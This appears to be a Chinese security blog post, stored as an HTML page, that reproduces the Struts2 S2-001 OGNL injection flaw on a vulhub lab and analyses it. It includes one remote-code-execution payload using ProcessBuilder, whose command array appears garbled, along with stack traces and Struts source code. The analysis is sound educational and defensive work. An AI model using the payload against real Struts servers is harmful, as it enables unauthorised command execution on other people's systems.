@@ -1,0 +1,405 @@
+<!DOCTYPE HTML>
+<html  lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>Struts2 历史漏洞分析 — S2-001 - 浅蓝 's blog</title>
+	
+    <!-- 使用url函数转换相关路径 -->
+	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js" data-no-instant></script>
+	<script src="/usr/themes/Bigfa/static/js/lately.min.js" data-no-instant></script>
+    <link rel="stylesheet" href="/usr/themes/Bigfa/static/css/style.css">
+	
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="背景最近打算开始更一些漏洞复现/分析的文章，所以决定先从&quot;漏洞之王&quot;——Struts2 开始。主要有用到三个辅助工具。IDEA ：这是一个 java 开发 IDE ，功能非常强大。（eclips..." />
+<meta name="keywords" content="Struts2漏洞分析" />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="Bigfa" />
+<link rel="alternate" type="application/rss+xml" title="Struts2 历史漏洞分析 — S2-001 &raquo; 浅蓝 's blog &raquo; RSS 2.0" href="https://b1ue.cn/feed/archives/93.html" />
+<link rel="alternate" type="application/rdf+xml" title="Struts2 历史漏洞分析 — S2-001 &raquo; 浅蓝 's blog &raquo; RSS 1.0" href="https://b1ue.cn/feed/rss/archives/93.html" />
+<link rel="alternate" type="application/atom+xml" title="Struts2 历史漏洞分析 — S2-001 &raquo; 浅蓝 's blog &raquo; ATOM 1.0" href="https://b1ue.cn/feed/atom/archives/93.html" />
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-93'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-93'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-93'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _Y1Jp = //'11'
+'1'+/* 'eOG'//'eOG' */''+//'Zr'
+'43'+//'AGl'
+'a09'+'7'//'x'
++//'K'
+'94'+//'AtO'
+'9'+/* 'lIB'//'lIB' */''+'ES'//'ES'
++/* 'vam'//'vam' */''+//'J'
+'e'+'4c'//'3'
++'5'//'Lx'
++//'Syi'
+'0a9'+//'Gj'
+'8f1'+//'jPj'
+'fc'+'TN'//'TN'
++//'B'
+'19'+'d47'//'w'
++'196'//'0'
++'5'//'fe'
++/* 'Zlc'//'Zlc' */''+'2'//'YB'
+, _AsnIhGz = [[10,12],[22,24]];
+    
+    for (var i = 0; i < _AsnIhGz.length; i ++) {
+        _Y1Jp = _Y1Jp.substring(0, _AsnIhGz[i][0]) + _Y1Jp.substring(_AsnIhGz[i][1]);
+    }
+
+    return _Y1Jp;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/styles/customemin.css" /><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/lines.css" /></head>
+
+<body class="is-enableBrandingButtons is-js">
+  <div class="site-main surface-container"> 
+    <div class="butterBar"><p class="butterBar-message"></p></div> 
+   
+   <header class="metabar metabar--bordered metabar--top u-clearfix"> 
+    <div class="metabar-block u-floatLeft" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"> 
+     <h1 class="site-title u-floatLeft" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"> <a href="https://b1ue.cn/" class="logo" title="浅蓝 's blog"> <img src="/logo.png" width="38" /></a></h1>  
+    </div> 
+    <div class="metabar-block metabar-center"> 
+		 <nav class="navTabs navTabs--metabar navTabs--narrow" itemtype="http://schema.org/SiteNavigationElement" itemscope=""> 
+			 <div class="layoutSingleColumn layoutSingleColumn--wide">
+				  <ul class="subnav-ul">
+										<li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/category.html">分类</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/archives.html">归档</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/links.html">友情链接</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/about.html">关于我</a></li>									  </ul>
+			 </div>
+		</nav> 
+    </div> 
+    <div class="metabar-block u-floatRight"> 
+     <form id="search" class="metabar-predictiveSearch search-form" action="https://b1ue.cn/" role="search" method="GET"> 
+        <label title="Search 浅蓝 's blog"> 
+        <svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
+          <symbol viewBox="0 0 25 25" id="svg-search">
+            <title>svg-search</title>
+            <path d="M20.067 18.933l-4.157-4.157c.837-1.032 1.34-2.345 1.34-3.776 0-3.314-2.686-6-6-6s-6 2.686-6 6 2.686 6 6 6c1.43 0 2.744-.503 3.776-1.34l4.157 4.157c.113.113.27.183.442.183.345 0 .625-.28.625-.625 0-.173-.07-.33-.183-.442zM6.5 11c0-2.62 2.13-4.75 4.75-4.75S16 8.38 16 11s-2.13 4.75-4.75 4.75S6.5 13.62 6.5 11z"
+            />
+          </symbol>
+        </svg>
+        <svg viewBox="0 0 25 25" width="25" height="25" class="svgIcon">
+            <use class="svgIcon-use" xlink:href="#svg-search">
+            </use>
+        </svg>
+         <input id="input" class="textInput textInput--dark textInput--rounded" name="s" type="text" required="true" placeholder="Search 浅蓝 's blog" /> 
+  	   </label>
+     </form> 
+    </div> 
+   </header>
+
+
+    
+    
+
+<div class="layoutSingleColumn">
+    <article class="u-paddingTop50" itemscope="itemscope" itemtype="http://schema.org/Article">
+      <header class="entry-header">
+        <h2 class="entry-title" itemprop="headline">Struts2 历史漏洞分析 — S2-001</h2>
+        <div class="entry-meta">
+            <a><time class="lately-a" datetime="2019-02-28 11:11:00" itemprop="datePublished">2019-02-28 11:11:00</time></a>
+            <span class="middotDivider"></span>
+            <a href="https://b1ue.cn/archives/93.html"><a href="https://b1ue.cn/category/vul/">漏洞</a></a>
+        </div>
+      </header>
+
+      <meta itemscope itemprop="mainEntityOfPage"  itemType="https://schema.org/WebPage" itemid="https://b1ue.cn/archives/93.html"/>
+
+        <div class="grap" itemprop="articleBody">
+            <h2>背景</h2><p>最近打算开始更一些漏洞复现/分析的文章，所以决定先从"漏洞之王"——Struts2 开始。</p><p>主要有用到三个辅助工具。</p><ol><li>IDEA ：这是一个 java 开发 IDE ，功能非常强大。（eclipse 真的很辣鸡）</li><li>vulhub：P神的漏洞靶场（相似的还有 vulapps）</li><li>javaweb-expression：我司大神园长开发的spel、ognl、mvel表达式 hook 工具（<a href="http://javaweb.org/?p=1862" target="_blank">http://javaweb.org/?p=1862</a>）</li></ol><h2>关于S2-001</h2><p>这是 S2 框架最早被公开的代码执行漏洞，具体详情可参见下方链接。</p><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p><p>影响范围： Struts 2.0.0 - Struts 2.0.8 , WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5</p><p>官方是这么说的：altSyntax 功能允许将OGNL表达式插入到文本字符串中并以递归方式处理。</p><p>使用struts2的 s标签提交表单，如果验证失败则会在服务端进行一次 OGNL 表达式验证。</p><p>官方给出了一段代码：</p><pre><code>&lt;s:form action=&quot;editUser&quot;&gt;
+  &lt;s:textfield name=&quot;name&quot; /&gt;
+  &lt;s:textfield name=&quot;phoneNumber&quot; /&gt;
+&lt;/s:form&gt;</code></pre><p>e.g: 我向这个页面提交数据  <code>?name=%{222-111}&amp;phoneNumber=123</code> ，在后端没有通过验证，返回到页面的时候你会发现 <code>name</code> 文本框的值变成了 <code>111</code> ，也就是 <code>%{222-111}</code>计算后的结果。这是因为默认情况下，参数值被处理为 %{name} ，OGNL表达式是递归计算的，所以他真正执行的表达式是 <code>%{ %{ 222-111 } }</code> 。</p><p>可见这是因为 OGNL 表达式导致的<br>p.s : struts2 的大部分漏洞，都是由 OGNL 表达式引起。</p><blockquote><p>不知道 OGNL 表达式的可以参考这篇文章，<a href="https://www.cnblogs.com/renchunxiao/p/3423299.html" target="_blank">https://www.cnblogs.com/renchunxiao/p/3423299.html</a></p></blockquote><h2>复现</h2><p><a href="https://github.com/vulhub/vulhub/tree/master/struts2/s2-001" target="_blank">https://github.com/vulhub/vulhub/tree/master/struts2/s2-001</a></p><p>docker 启动 vulhub s2-001 的容器。</p><blockquote><p>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"d")).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</p></blockquote><p><img src="/usr/uploads/2019/02/225962600.jpg" alt="1551323390(1).jpg" title="1551323390(1).jpg"></p><h1>分析</h1><p><img src="/usr/uploads/2019/02/4229204586.jpg" alt="1551323397(1).jpg" title="1551323397(1).jpg"></p><p>通过简单的计算，可以看到 ognl 表达式已经执行。</p><p>回到 idea，ognl 表达式的栈轨迹已经被打印出来。</p><pre><code>---------------------------------EXP-----------------------------------------
+2222-1111
+---------------------------------璋冪敤閾 ---------------------------------------
+java.lang.Thread.getStackTrace(Thread.java:1559)
+org.javaweb.expression.Agent.expression(Agent.java:179)
+ognl.Ognl.parseExpression(Ognl.java)
+com.opensymphony.xwork2.util.OgnlUtil.compile(OgnlUtil.java:203)
+com.opensymphony.xwork2.util.OgnlUtil.getValue(OgnlUtil.java:194)
+com.opensymphony.xwork2.util.OgnlValueStack.findValue(OgnlValueStack.java:238)
+com.opensymphony.xwork2.util.TextParseUtil.translateVariables(TextParseUtil.java:122)
+com.opensymphony.xwork2.util.TextParseUtil.translateVariables(TextParseUtil.java:71)
+org.apache.struts2.components.Component.findValue(Component.java:313)
+org.apache.struts2.components.UIBean.evaluateParams(UIBean.java:723)
+org.apache.struts2.components.UIBean.end(UIBean.java:481)
+org.apache.struts2.views.jsp.ComponentTagSupport.doEndTag(ComponentTagSupport.java:43)
+................此处省略
+org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1085)
+org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:658)
+org.apache.coyote.http11.Http11AprProtocol$Http11ConnectionHandler.process(Http11AprProtocol.java:277)
+org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.doRun(AprEndpoint.java:2407)
+org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:2396)
+java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
+java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
+org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+java.lang.Thread.run(Thread.java:748)
+--------------------------------------------------------------------------</code></pre><p>我在 <code>UIBean.java</code> 的 298 行打了一个断点。</p><p>问题就出在 <code>if (this.altSyntax()) {</code>这一行，刚才有提到过漏洞是因为 altSyntax 功能引发的，它的作用是允许s2标签用使用表达式。</p><p><img src="/usr/uploads/2019/02/1168313303.jpg" alt="1551323409(1).jpg" title="1551323409(1).jpg"></p><p>此时表达式已成 <code>%{username}</code></p><p>这里放上罪魁祸首之一 translateVariables 方法的源码。</p><pre><code>public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator) {
+        Object result = expression; # %{username}
+
+        while(true) {  # 递归执行 OGNL 
+            int start = expression.indexOf(open + &quot;{&quot;);
+            int length = expression.length();
+            int x = start + 2;
+            int count = 1;
+
+            while(start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) {
+                char c = expression.charAt(x++);
+                if (c == '{') {
+                    ++count;
+                } else if (c == '}') {
+                    --count;
+                }
+            }
+
+            int end = x - 1;
+            if (start == -1 || end == -1 || count != 0) { //结束条件
+                return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);
+            }
+
+            String var = expression.substring(start + 2, end);   # 取出%{}里的表达式  第一次 : username  第二次: 2222-1111 
+            Object o = stack.findValue(var, asType);  # 这里开始计算 OGNL 表达式。 第一次 将 username 通过反射从 action 对象里取出。 第二次：将 username 属性的值再次执行一遍。
+            
+            if (evaluator != null) {
+                o = evaluator.evaluate(o);
+            }
+
+            String left = expression.substring(0, start);
+            String right = expression.substring(end + 1);
+            if (o != null) {
+                if (TextUtils.stringSet(left)) {
+                    result = left + o;
+                } else {
+                    result = o;
+                }
+
+                if (TextUtils.stringSet(right)) {
+                    result = result + right;
+                }
+
+                expression = left + o + right;
+            } else {
+                result = left + right;
+                expression = left + right;
+            }
+        }
+    }</code></pre><p><img src="/usr/uploads/2019/02/1152342284.jpg" alt="1551323420(1).jpg" title="1551323420(1).jpg"></p><p>继续跟进，直到这一步<code>invokeMethod:518, OgnlRuntime (ognl)</code>，他通过反射调用 Action 对象的 get 方法来获取 username 属性，也就是我的payload <code>%{222-111}</code>。</p><p><img src="/usr/uploads/2019/02/3377952943.jpg" alt="1551323431(1).jpg" title="1551323431(1).jpg"></p><p>最终回到了 translateVariables 方法，递归的执行 ognl 表达式，再次执行了一遍 %{222-111}。</p><p>这里我给出一份从 translateVariables 方法开始的一个完整调用过程。</p><pre><code>findValue:230, OgnlValueStack (com.opensymphony.xwork2.util)
+
+getValue:194, OgnlUtil (com.opensymphony.xwork2.util)
+
+compile:199, OgnlUtil (com.opensymphony.xwork2.util)
+
+getValue:331, Ognl (ognl)
+
+getValue:182, SimpleNode (ognl)
+
+evaluateGetValueBody:161, SimpleNode (ognl)
+
+getValueBody:89, ASTProperty (ognl)
+
+getProperty:1637, OgnlRuntime (ognl)
+
+getProperty:75, CompoundRootAccessor (com.opensymphony.xwork2.util)
+
+getProperty:1637, OgnlRuntime (ognl) [2]
+
+getProperty:58, OgnlValueStack$ObjectAccessor (com.opensymphony.xwork2.util)
+
+getProperty:118, ObjectPropertyAccessor (ognl)
+
+getPossibleProperty:50, ObjectPropertyAccessor (ognl)
+
+getMethodValue:931, OgnlRuntime (ognl)
+
+invokeMethod:518, OgnlRuntime (ognl)</code></pre><h2>总结</h2><p>最后总结一下 S2-001 的一个触发条件。</p><ol><li>开启 altSyntax  功能</li><li>使用 s 标签处理表单</li><li>action 返回错误</li><li>OGNL 递归处理</li></ol><p>值得一提的是 Struts2 官方给出了一个解决办法中提到了。</p><blockquote><p>从XWork 2.0.4开始，OGNL解析被更改，因此它不是递归的。因此，在上面的示例中，结果将是预期的％{1 + 1}。</p></blockquote><p>也就是只会获取到 username 的内容，而不会再把 username 里的内容再执行一遍。</p>        </div>
+    </article>
+
+    <div id="comments">
+        
+        <div id="respond-post-93" class="respond">
+    
+        <h3 id="response" class="comments-title">发表留言</h3>
+
+        <form method="post" action="https://b1ue.cn/archives/93.html/comment" id="comment-form" class="responsesForm" role="form">
+            <p class="comment-note">如未标注转载则文章均为本人原创，转载前先吱声，未授权转载我就锤爆你狗头。</p>
+            <p class="comment-note">人生在世，错别字在所难免，无需纠正。</p>
+                        <p  class="comment-form-author comment-form-input">
+                <label for="author">称呼</label>
+                <input type="text" name="author" id="author" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-email comment-form-input">
+                <label for="mail">Email</label>
+                <input type="text" name="mail" id="mail" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-url comment-form-input">
+                <label for="url">网站</label>
+                <input type="text" name="url" id="url" class="inputGroup" placeholder="http://" value="" />
+            </p>
+                        <p class="comment-form-comment comment-form-input">
+                <label for="textarea">内容</label>
+                <textarea rows="8" cols="50" name="text" id="comment" class="inputGroup inputTextarea" required ></textarea>
+            </p>
+            <p class="form-submit">
+                <button type="submit" id="submit" class="submit">提交评论</button><a id="cancel-comment-reply-link" href="https://b1ue.cn/archives/93.html#respond-post-93" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </p>
+        </form>
+    </div>
+    </div>
+
+
+
+</div><!-- end #main-->
+
+
+<footer class="footer--empty"></footer>
+  </div> <!-- 对应site-main surface-container -->
+<div class="loadingBar"></div>
+<script type="text/javascript" src="/usr/plugins/ColorHighlight/res/highlight.js?version=9.12.0">
+        </script><script type="text/javascript" src="/usr/plugins/ColorHighlight/guess.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/clipboard.min.js"></script><script type="text/javascript">$("pre code").each(function(i, block) {hljs.highlightBlock(block);});var l = $("pre code").find("ul").length;
+if(l<=0){
+    $("pre code").each(function(){
+        $(this).html("<ul><li>" + $(this).html().replace(/\n/g,"\n</li><li>") +"\n</li></ul>");
+    });
+  }</script>		<script type="text/javascript" src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js" data-no-instant></script>
+			<script src="/usr/themes/Bigfa/static/js/view-image.min.js" data-no-instant></script>
+		    <script src="https://cdn.bootcss.com/instantclick/3.0.0/instantclick.min.js" data-no-instant></script>
+    <script data-no-instant>
+		InstantClick.on('change', function(isInitialLoad) {
+			$("pre code").each(function(i, block) {hljs.highlightBlock(block);});
+						jQuery(document).ready(function () {
+				$.lately({
+					'target' : '.lately-a,.lately-b,.lately-c'
+				});
+				jQuery.viewImage({
+				'target' : '.view-image img', //需要使用ViewImage的图片
+				'exclude': '.exclude img',    //要排除的图片
+				'delay'  : 300                //延迟时间
+				});
+			});
+		});
+		InstantClick.init('mousedown');
+    </script>
+		
+		<script>
+	(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();	</script>
+	
+</body>
+</html>
